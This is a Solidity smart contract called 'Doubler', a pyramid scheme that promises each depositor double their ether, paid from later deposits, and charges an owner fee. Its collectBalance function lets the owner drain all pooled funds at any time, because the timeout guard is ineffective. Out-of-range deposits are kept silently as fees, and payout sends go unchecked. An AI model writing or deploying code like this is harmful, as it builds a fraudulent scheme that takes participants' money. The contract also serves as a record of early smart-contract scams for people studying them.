 

contract Doubler{

    struct Participant {
        address etherAddress;
        uint PayAmount;
    }

    Participant[] public participants;

    uint public payoutIdx = 0;
    uint public collectedFees = 0;
    uint public balance = 0;
	uint public timeout = now + 1 weeks;

    address public owner;


     
    modifier onlyowner { if (msg.sender == owner) _ }

     
    function Doubler() {
		collectedFees += msg.value;
        owner = msg.sender;
    }

     
    function() {
        enter();
    }
    
    function enter() {
		 
		if (msg.value >= 100 finney && msg.value <= 50 ether) {
	         
	        collectedFees += msg.value / 20;
	        balance += msg.value - msg.value / 20;
	
	      	 
	        uint idx = participants.length;
	        participants.length += 1;
	        participants[idx].etherAddress = msg.sender;
	        participants[idx].PayAmount = 2 * (msg.value - msg.value / 20);
			
			uint NeedAmount = participants[payoutIdx].PayAmount;
			 
		    if (balance >= NeedAmount) {
	            participants[payoutIdx].etherAddress.send(NeedAmount);
	
	            balance -= NeedAmount;
	            payoutIdx += 1;
	        }
		}
		else {
			collectedFees += msg.value;
            return;
		}
    }

	function NextPayout() {
        balance += msg.value;
		uint NeedAmount = participants[payoutIdx].PayAmount;

	    if (balance >= NeedAmount) {
            participants[payoutIdx].etherAddress.send(NeedAmount);

            balance -= NeedAmount;
            payoutIdx += 1;
        }
    }

    function collectFees() onlyowner {
		collectedFees += msg.value;
        if (collectedFees == 0) return;

        owner.send(collectedFees);
        collectedFees = 0;
    }

    function collectBalance() onlyowner {
		balance += msg.value;
        if (balance == 0 && now > timeout) return;

        owner.send(balance);
        balance = 0;
    }

    function setOwner(address _owner) onlyowner {
		collectedFees += msg.value;
        owner = _owner;
    }
}